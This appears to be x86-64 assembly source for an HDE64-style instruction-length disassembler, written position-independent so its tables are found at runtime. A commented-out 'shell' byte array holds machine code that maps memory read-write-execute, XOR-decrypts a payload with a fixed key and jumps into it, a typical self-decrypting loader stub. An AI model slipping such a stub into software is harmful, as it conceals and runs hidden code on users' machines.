;section  .data
section  .text
%include  "hde64.inc"
%macro   macro_lock_is_valid 0
      test  dword[rdx+hde64s.prefix],  PRE_LOCK
      jz    if_errnoneous
      test  bl,   C_MODRM
      jz    err_lock
      cmp   cl,   3
      je    err_lock
      mov   ecx,  sizeof_lock_table_0F
      call  delta_tab_0F
   delta_tab_0F:
      pop   rdi
      add   rdi,  lock_table_0F-delta_tab_0F
      ;lea   rdi,  [lock_table_0F]
      cmp   byte[rdx+hde64s.opcode],   0x0F
      je    search_opcode
      and   bh,   0xFE
      mov   ecx,  sizeof_lock_table
      call  delta2_tab_0F
   delta2_tab_0F:
      pop   rdi
      add   rdi,  lock_table_0F-delta2_tab_0F
      ;lea   rdi,  [lock_table_0F]
   search_opcode:
      cmp   byte[rdi],  bh
      lea   rdi,  [rdi+2]
      loopnz   search_opcode
      jnz   err_lock
      mov   cl,   [rdx+hde64s.modrm_ro]
      mov   al,   [rdi-1]
      inc   cl
      shr   al,   cl
      jnc   if_errnoneous 
   err_lock:
      or    dword[rdx+hde64s.flags],   F_ERROR_LOCK
   if_errnoneous:
    ;set F_ERROR_X86_64, F_RELATIVE and F_GROUP
%endmacro

%macro   macro_x86_64_is_valid   0
   check_x86_64:
      test  bl,   C_ERROR
      jz    check_relative
      or    dword[rdx+hde64s.flags],   F_ERROR_X86_64
   check_relative:
      test  bl,   C_REL
      jz    check_group
      or    dword[rdx+hde64s.flags],   F_RELATIVE
   check_group:
      test  bl,   C_GROUP
      jz    check_out 
      or    dword[rdx+hde64s.flags],   F_GROUP
   check_out: 
%endmacro

%macro   macro_vex   0
      mov   byte[rdx+hde64s.opcode], 0x0F
      or    byte[rdx+hde64s.prefix], PRE_VEX
      mov   [rdx+hde64s.p_vex],  al
      mov   cl,   al
      lodsb
      mov   [rdx+hde64s.p_vex2], al
      test  byte[rdx+hde64s.prefix], PRE_LOCK+PRE_66+PRE_REX+PRE_REP
      jz    pre_vex2
      or    dword[rdx+hde64s.flags],  F_VEX_BAD_PREFIX
   pre_vex2:
      cmp   cl,   PREFIX_VEX_2_BYTE
      jne   pre_vex3
      mov   ah,   al
      mov   cl,   al
      mov   ch,   al

      shl   ah,   1
      shr   ah,   4
      or    ah,   0xF0
      not   ah

      shr   al,   7
      or    al,   0xFE
      not   al
      
      shl   cl,   5
      shr   cl,   7
      and   ch,   3

      mov   byte[rdx+hde64s.vex_r], al
      mov   byte[rdx+hde64s.vex_vvv],  ah
      mov   word[rdx+hde64s.vex_l], cx
      jmp   vex_0F
   pre_vex3:
      mov   ah,   al
      mov   cl,   al
      mov   ch,   al
      
      shl   ah,   1
      shr   ah,   7
      or    ah,   0xFE
      not   ah

      shr   al,   7
      or    al,   0xFE
      not   al

      shl   cl,   2
      shr   cl,   7
      or    cl,   0xFE
      not   cl
      and   ch,   0x1F

      mov   word[rdx+hde64s.vex_r], ax
      mov   word[rdx+hde64s.vex_b], cx

      lodsb
      mov   byte[rdx+hde64s.p_vex3],   al
      mov   ah,   al
      mov   cl,   al
      mov   bl,   al

      shl   ah,   1
      shr   ah,   4
      or    ah,   0xF0
      not   ah

      shr   al,   7
      and   bl,   3 
      shl   cl,   5
      shr   cl,   7
       
      mov   word[rdx+hde64s.vex_w], ax
      mov   byte[rdx+hde64s.vex_l], cl
      mov   byte[rdx+hde64s.vex_pp],   bl
      cmp   ch,   M_MMMM_0F
      jne   vex_0F_38_3A 
   vex_0F:
      mov   bl,   C_0F
      jmp   hde_opcode2   
   vex_0F_38_3A:
      mov   bl,   C_3BYTE
      mov   bh,   0x38
      mov   byte[rdx+hde64s.opcode2],  bh
      cmp   ch,   M_MMMM_0F_38
      je    hde_opcode3
      mov   bh,   0x3A
      mov   byte[rdx+hde64s.opcode2],  bh
      jmp   hde_opcode3
%endmacro
;======================================================================================================================================================
;shell:   db 0x68, 0xCC, 0xAA, 0xDD, 0x00, 0x48, 0x81, 0xC2, 0xDD, 0xAA, 0xCC, 0x00, 0x48, 0xBE, 0x55, 0x99, 0x88, 0x77, 0xDD, 0xCC, 0xBB, 0x1A, 0x88, 0x42, 0x3C, 0x48, 0x89, 0x72, 0x3C, 0xC7, 0x42, 0x3C, 0x55, 0x99, 0x88, 0x77, 0x58, 0x57, 0x56, 0x52, 0x51, 0x50, 0x6A, 0x00, 0x5F, 0x6A, 0x0C, 0x58, 0x0F, 0x05, 0x50, 0x48, 0x05, 0x00, 0x10, 0x00, 0x00, 0x50, 0x5F, 0x6A, 0x0C, 0x58, 0x0F, 0x05, 0x5F, 0xBE, 0x00, 0x10, 0x00, 0x00, 0x6A, 0x07, 0x5A, 0x6A, 0x0A, 0x58, 0x0F, 0x05, 0x5E, 0x56, 0x57, 0xB8, 0xC7, 0xF4, 0xFF, 0xFF, 0x48, 0x63, 0xC0, 0x48, 0x01, 0xC6, 0xB9, 0x91, 0x01, 0x00, 0x00, 0xBA, 0xDD, 0xCC, 0xBB, 0xAA, 0x57, 0x57, 0x51, 0xAD, 0x31, 0xD0, 0xAB, 0xE2, 0xFA, 0x59, 0x5F, 0x5E, 0xAD, 0x31, 0xD0, 0xAB, 0xE2, 0xFA, 0x5F, 0xFF, 0xE7 
section  .text
global   _hde
;----------------------------------------------------------------------------------------------------
;IN:  rsi - addr of code;  rdi - addr of sruct
;OUT: sil - len of opcode; al==0 if ERROR else al==1; rdi isn't change
;----------------------------------------------------------------------------------------------------
_hde:
      ;push  rax
      push  rbx
      push  rcx
      push  rdx
      push  rdi
      
      push  rsi         ;##
      push  rdi
      pop   rdx
      xor   rcx,  rcx
      xor   rax,  rax   
      mov   cl,   hde64s_size/4
      rep   stosd
   pref:
      lodsb
   hde_restart:
      mov   cl,   al
      mov   ch,   al
      and   cl,   0xFE
      and   ch,   0xE7
      
      cmp   al,   PREFIX_LOCK
      je    pre_lock
      cmp   al,   PREFIX_OPERAND_SIZE
      je    pre_66
      cmp   al,   PREFIX_ADDRESS_SIZE
      je    pre_67
      cmp   cl,   PREFIX_REPNZ
      je    pre_rep
      cmp   cl,   PREFIX_SEGMENT_FS
      je    pre_seg
      cmp   ch,   PREFIX_SEGMENT_CS
      jnz   pre_rex

   pre_lock:
      or    byte[rdx+hde64s.prefix], PRE_LOCK
      mov   [rdx+hde64s.p_lock], al
      jmp   pref
   pre_66:
      or    byte[rdx+hde64s.prefix], PRE_66
      mov   [rdx+hde64s.p_66], al
      jmp   pref
   pre_67:
      or    byte[rdx+hde64s.prefix], PRE_67
      mov   [rdx+hde64s.p_67], al
      jmp   pref
   pre_rep:
      or    byte[rdx+hde64s.prefix], PRE_REP
      mov   [rdx+hde64s.p_rep], al
      jmp   pref
   pre_seg:
      or    byte[rdx+hde64s.prefix], PRE_SEG
      mov   [rdx+hde64s.p_seg], al
      jmp   pref
   pre_rex:
      mov   cl,   al
      and   cl,   0xF0
      cmp   cl,   PREFIX_REX_START
      jne   pre_vex
      or    byte[rdx+hde64s.prefix], PRE_REX
      mov   [rdx+hde64s.p_rex],  al
      mov   ah,   al
      mov   ch,   al
      mov   cl,   al
      shr   ah,   2
      and   ah,   1
      shr   al,   3
      and   al,   1
      shr   cl,   1
      and   cl,   1
      and   ch,   1 
      mov   word[rdx+hde64s.rex_w], ax
      mov   word[rdx+hde64s.rex_x], cx
      lodsb
   pre_vex:
      mov   cl,   al
      and   cl,   0xFE
      cmp   cl,   PREFIX_VEX_3_BYTE
      jne   hde_opcode
   ;MACROS1:  macro_vex
;-------------------------------------------------------------------------------------------------------------------------
   hde_opcode:
      mov   byte[rdx+hde64s.opcode], al
      mov   byte[rdx+hde64s.opcode_len], 1
      call  get_delta
   get_delta:
      pop   rbx
      add   rbx,  opcode_table-get_delta
      ;lea   rbx,  [opcode_table]
   hde_opcode_next:
      mov   ah,   al
      xlatb
      xchg  eax,  ebx

      cmp   bl,   C_UNDEFINED
      jne   pref_error
   undefined:
      or    dword[rdx+hde64s.flags],   F_ERROR_OPCODE
   hde_exit:
      xor   bl,   bl
      jmp   hde_is_valid
   
   pref_error:
      cmp   bl,   C_PREFIX
      jne   hde_opcode2
      or    dword[rdx+hde64s.flags],   F_REX_IGNORED
      mov   al,   PRE_REX
      not   al
      and   byte[rdx+hde64s.prefix],   al 
      xor   eax,  eax
      mov   dword[rdx+hde64s.p_rex],   eax
      mov   byte[rdx+hde64s.rex_b],    al
      mov   al,   bh
      ;jmp   hde_restart
      or    dword[rdx+hde64s.flags],   F_ERROR_OPCODE
      jmp   hde_is_valid

   hde_opcode2:
      cmp   bl,   C_0F
      jne   hde_opcode3
      lodsb
      mov   byte[rdx+hde64s.opcode2],   al
      mov   byte[rdx+hde64s.opcode_len],  2
      call get_delta2
   get_delta2:
      pop   rbx
      add   rbx,  opcode_table_0F-get_delta2
      ;lea   rbx,  [opcode_table_0F]
      jmp   hde_opcode_next

   hde_opcode3:
      cmp   bl,   C_3BYTE
      jne   hde_moffs
      lodsb
      mov   byte[rdx+hde64s.opcode3],  al 
      mov   byte[rdx+hde64s.opcode_len],  3
      xor   ecx,  ecx
      mov   ah,   sizeof_opcode_table_0F_38_V;sizeof_opcode_table_0F_38_V
      mov   cl,   sizeof_opcode_table_0F_38
      test  byte[rdx+hde64s.prefix],   PRE_VEX
      jz    skip_0F_38_V
      mov   cl,   ah
   skip_0F_38_V:
      call get_delta3
   get_delta3:
      pop   rdi
      add   rdi,  opcode_table_0F_38-get_delta3
      ;lea   rdi,  [opcode_table_0F_38]
      mov   bl,   C_MODRM
      cmp   bh,   0x38
      je    hde_lookup
      mov   ah,   sizeof_opcode_table_0F_3A_V
      mov   cl,   sizeof_opcode_table_0F_3A
      test  byte[rdx+hde64s.prefix],   PRE_VEX 
      jz    skip_0F_3A_V
      mov   cl,   ah
   skip_0F_3A_V:
      call get_delta4
   get_delta4:
      pop   rdi 
      add   rdi,  opcode_table_0F_3A-get_delta4
      ;lea   rdi,  [opcode_table_0F_3A]
      mov   bl,   C_MODRM+C_IMM8
   hde_lookup:
      repnz scasb
      jnz   undefined
      mov   bh,   al
      jmp   hde_modrm

   hde_moffs:
      cmp   bl,   C_MOFFS
      jnz   hde_modrm
      lea   rdi,  [rdx+hde64s.disp8]
      test  byte[rdx+hde64s.prefix],   PRE_67
      jz    disp64
      or    dword[rdx+hde64s.flags],   F_DISP32
      movsd 
      xor   bl,   bl
      jmp   hde_is_valid
   disp64:
      or    dword[rdx+hde64s.flags],   F_DISP64
      movsq
      xor   bl,   bl
      jmp   hde_is_valid

   hde_modrm:
      test  bl,   C_MODRM
      jz    hde_imm
      lodsb
      or    dword[rdx+hde64s.flags],   F_MODRM
      mov   byte[rdx+hde64s.modrm],    al
      mov   cl,   al
      mov   ch,   al
      shr   cl,   6
      shl   ch,   2
      shr   ch,   5
      and   al,   7
      mov   word[rdx+hde64s.modrm_mod],   cx
      mov   [rdx+hde64s.modrm_rm],  al
      ;F6/F7 have immediate-bytes only if modrm.reg=0 (test)
      mov   ah,   byte[rdx+hde64s.opcode]
      and   ah,   0xFE
      cmp   ah,   0xF6
      jnz   no_F6_F7
      test  ch,   ch
      jz    no_F6_F7
      mov   ah,   C_IMM8+C_IMM32
      not   ah
      and   bl,   ah
   no_F6_F7:
      cmp   cl,   MOD_DISP32
      je    modrm_disp32
      cmp   cl,   MOD_DISP8
      je    modrm_disp8
      test  cl,   cl
      jnz   hde_sib
      cmp   al,   RM_DISP32
      jnz   hde_sib
      or    dword[rdx+hde64s.flags],   F_RIPDISP32+F_RELATIVE
   modrm_disp32:
      or    dword[rdx+hde64s.flags],   F_DISP32
      jmp   hde_sib
   modrm_disp8:
      or    dword[rdx+hde64s.flags],   F_DISP8

   hde_sib:
      cmp   cl,   MOD_REG
      je    hde_disp
      cmp   al,   RM_SIB
      jne   hde_disp
      lodsb
      or    dword[rdx+hde64s.flags],   F_SIB
      mov   byte[rdx+hde64s.sib],   al
      mov   ah,   al
      mov   ch,   al
      shl   ah,   2
      shr   ah,   5
      shr   al,   6
      and   ch,   7
      mov   word[rdx+hde64s.sib_scale],   ax
      mov   byte[rdx+hde64s.sib_base],    ch

      test  cl,   cl
      jnz   hde_disp
      cmp   ch,   REG_RBP
      jne   hde_disp
      or    dword[rdx+hde64s.flags],   F_DISP32

   hde_disp:
      lea   rdi,  [rdx+hde64s.disp8]
      test  dword[rdx+hde64s.flags],   F_DISP32
      jz    hde_disp8
      movsd
   hde_disp8:
      test  dword[rdx+hde64s.flags],   F_DISP8
      jz    hde_imm
      movsb

   hde_imm:
      lea   rdi,  [rdx+hde64s.imm8]
      test  bl,   C_IMM32
      jz    hde_imm16
     ; B8-BF have a 64bit immediate if rex.w=1 
      mov   al,   byte[rdx+hde64s.opcode]
      and   al,   0xF8
      cmp   al,   0xB8
      jne   no_B8_BF
      cmp   byte[rdx+hde64s.rex_w],  1
      jne   no_B8_BF
      or    dword[rdx+hde64s.flags], F_IMM64
      movsq
      xor   bl,   bl
      jmp  hde_is_valid 
   no_B8_BF:
      test  bl,   C_REL
      jnz   hde_imm32
      cmp   byte[rdx+hde64s.rex_w], 1
      je    hde_imm32
      test  byte[rdx+hde64s.prefix],   PRE_66
      jz    hde_imm32 
      or    dword[rdx+hde64s.flags],   F_IMM16
      movsw
      jmp   got_32_16
   hde_imm32:
      or    dword[rdx+hde64s.flags],   F_IMM32
      movsd
      got_32_16:
      lea   rdi,  [rdx+hde64s.imm8_2]
   hde_imm16:
      test  bl,   C_IMM16
      jz    hde_imm8
      or    dword[rdx+hde64s.flags],   F_IMM16
      movsw 
      lea   rdi,  [rdx+hde64s.imm8_2]
   hde_imm8:
      test  bl,   C_IMM8
      jz    hde_is_valid
      or    dword[rdx+hde64s.flags],   F_IMM8
      movsb

   hde_is_valid:
   ;MACROS2:   macro_lock_is_valid  
   ;MACROS3:   macro_x86_64_is_valid
      
hde_finish:
      pop   rax         ;##
      sub   rsi,  rax
      mov   byte[rdx+hde64s.len],  sil
      cmp   sil,  15
      jb    hde15
      or    dword[rdx+hde64s.flags],   F_ERROR_LENGTH
   hde15:
      xor   rax,  rax
      test  dword[rdx+hde64s.flags],   F_VEX_BAD_PREFIX+F_ERROR_OPCODE+F_ERROR_LENGTH+F_ERROR_LOCK+F_ERROR_X86_64
      sete  al
   end_hde:
      pop   rdi
      pop   rdx
      pop   rcx
      pop   rbx
      ;pop   rax
   ret


